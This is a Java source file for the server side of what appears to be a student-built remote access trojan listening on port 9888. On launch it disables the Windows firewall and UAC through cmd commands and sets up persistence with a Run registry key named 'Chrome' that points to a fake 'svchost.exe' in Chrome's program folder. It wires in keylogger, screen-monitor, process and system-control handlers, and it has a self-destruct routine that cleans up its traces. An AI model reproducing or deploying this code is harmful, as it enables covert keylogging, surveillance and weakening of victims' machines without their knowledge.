package team6.server;

import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.Win32Exception;
import com.sun.jna.platform.win32.WinReg;
import java.awt.AWTException;
import java.io.File;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.util.logging.Level;
import java.util.logging.Logger;
import team6.server.handler.Applications;
import team6.server.handler.Keylogger;
import team6.server.handler.Monitor;
import team6.server.handler.Processes;
import team6.server.handler.SystemCtrl;
import team6.server.socket.SocketHandler;

public class Server {
    
    private ServerSocket serverSocket;
    private SocketHandler socketHandler;

    private Processes processes;
    private Applications applications;
    private Monitor monitor;
    private Keylogger keylogger;
    private SystemCtrl systemCtrl;

    public Server(int port) throws IOException {
        firstRun();
        serverSocket = new ServerSocket(port);
        while (true) {
            try {
                setUpConnections();
            } catch (Exception ex) {
                Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
                socketHandler.send(new String("<DISC>$<>").getBytes());
            }
        }

    }

    private void setUpConnections() throws IOException, AWTException, InterruptedException {
        System.out.println("Waiting for new connection ...");
        Socket mainSocket = serverSocket.accept();
        socketHandler = new SocketHandler(mainSocket);
        System.out.println("Connected to new client");

        processes = new Processes(serverSocket.accept());
        applications = new Applications(serverSocket.accept());
        monitor = new Monitor(serverSocket.accept());
        keylogger = new Keylogger(serverSocket.accept());
        systemCtrl = new SystemCtrl(serverSocket.accept());

        while (!mainSocket.isClosed()) {
            String message = socketHandler.receive();
            if (message != null && message.equals("<DISC>$<>")) {
                disconnect();
            } else if (message != null && message.equals("<DESTROY>$<>")) {
                destroy();
            }
        }
    }

    private void disconnect() {
        try {
            processes.close();
            processes.stop();
            applications.close();
            applications.stop();
            monitor.close();
            monitor.stop();
            keylogger.close();
            keylogger.stop();
            systemCtrl.close();
            systemCtrl.stop();
            socketHandler.close();
        } catch (NullPointerException ex) {
            Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
        }

    }
    
    private void destroy() {
        disconnect();
        boolean existed = true;
        try {
            String regValue = Advapi32Util.registryGetStringValue(WinReg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Chrome");
        } catch (Win32Exception ex) {
            existed = false;
        }
        if (existed) {
            try {
                Advapi32Util.registryDeleteValue(WinReg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Chrome");
                Runtime.getRuntime().exec("cmd /c reg.exe ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f");
                Runtime.getRuntime().exec("cmd /c netSh advfirewall set allprofiles state on");
                Runtime.getRuntime().exec("cmd /c ping localhost -n 3 > nul && del \"svchost .exe\"");
                Runtime.getRuntime().exec("cmd /c ping localhost -n 3 > nul && del \"Remote_Server.jar\"");
                Runtime.getRuntime().exec("cmd /c ping localhost -n 3 > nul && del lib\\* /s /q && rmdir lib /s /q exit 0");
            } catch (IOException ex) {
                Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
  
        System.exit(0);
    }
    
    private void firstRun() {
        Thread th = new Thread() {
            @Override
            public void run() {
                String regValue = null;
                try {
                    Runtime.getRuntime().exec("cmd /c netSh advfirewall set allprofiles state off");
                    Runtime.getRuntime().exec("cmd /c reg.exe ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
                    regValue = Advapi32Util.registryGetStringValue(WinReg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Chrome");
                } catch (Win32Exception ex) {
                    try {
                        final String startUpDirectory = "C:/Program Files/Google/Chrome/Application/SetupMetrics";
                        File startUpExe = new File(startUpDirectory);
                        if (!startUpExe.exists()) {
                            Files.createDirectories(startUpExe.toPath());
                        }
                        startUpExe = new File(startUpDirectory + "/svchost.exe");
                        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Chrome", "\"" + startUpExe.getAbsolutePath() + "\" -silent");
                    } catch (IOException ex1) {
                        Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex1);
                    }
                } catch (IOException ex) {
                    Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        };
        th.start();
}

    public static void main(String args[]) {
        try {
            Server server = new Server(9888);
        } catch (IOException ex) {
            Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
